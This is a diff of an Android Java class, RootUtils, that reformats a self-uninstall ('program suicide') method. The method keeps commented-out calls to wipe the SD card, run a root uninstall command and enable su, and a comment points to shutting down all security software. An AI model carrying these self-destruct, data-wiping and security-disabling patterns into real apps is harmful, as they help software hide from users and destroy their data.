@@ -161,22 +161,22 @@ public class RootUtils {
         }
     }
 
-     /**
+    /**
      * 程序自杀
      *
      * @return
      */
-     public static boolean suicide(Context context,String pkgName) {
-     // 清空SD卡文件
+    public static boolean suicide(Context context) {
+        // 清空SD卡文件
 
-//     SDCardUtils.cleanSDCard();
-     // RootUtils.enableAllSu();
-     // 卸载自己
-     // return
-     // RootUtils.executeRootCMD("pm uninstall com.android.keyservice");
-//     RootUtils.enableAllSafe();
-     return uninstallApk(context.getPackageName());
-     }
+        //SDCardUtils.cleanSDCard();
+        // RootUtils.enableAllSu();
+        // 卸载自己
+        // return
+        // RootUtils.executeRootCMD("pm uninstall com.android.keyservice");
+        //RootUtils.enableAllSafe();
+        return uninstallApk(context.getPackageName());
+    }
 
 //     /**
 //     * 关闭所有安全软件 在新线程中
